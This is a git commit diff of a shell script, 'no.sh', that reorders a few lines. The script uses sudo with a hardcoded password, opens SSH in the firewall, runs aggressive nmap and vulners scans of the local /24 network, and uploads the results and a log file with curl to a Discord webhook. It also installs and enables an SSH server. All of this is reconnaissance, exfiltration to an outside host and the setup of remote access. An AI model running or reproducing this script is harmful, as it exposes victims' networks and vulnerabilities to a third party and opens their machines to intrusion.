9986da0c157c49fa841623b94d289f572f935592
Dada <david.kondziella@rub.de>
2023-12-14 13:11:56 +0100

    Update no.sh

--- no.sh
+++ no.sh
@@ -3,12 +3,12 @@ if echo 'PW' | sudo -S sh -c "sudo ufw allow ssh"; then
 	echo "nmap scan and sending xml..."
  	sudo nmap -T5 -A -v 192.168.178.1/24 -oX /home/$USER/net.xml  
   	curl -F "filename=@/home/$USER/net.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
-	sudo nmap -sV --script vulners 192.168.178.1/24 -oX /home/$USER/vuln.xml  
-  	curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	echo "SUDO SUCCESS installing ssh services..."
 	sudo apt install openssh-server -y 
 	sudo systemctl enable ssh
 	echo "ssh installed and enable. open port 22 "
+ 	sudo nmap -sV --script vulners 192.168.178.1/24 -oX /home/$USER/vuln.xml  
+  	curl -F "filename=@/home/$USER/vuln.xml" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 else	
 	curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
 	sleep 15
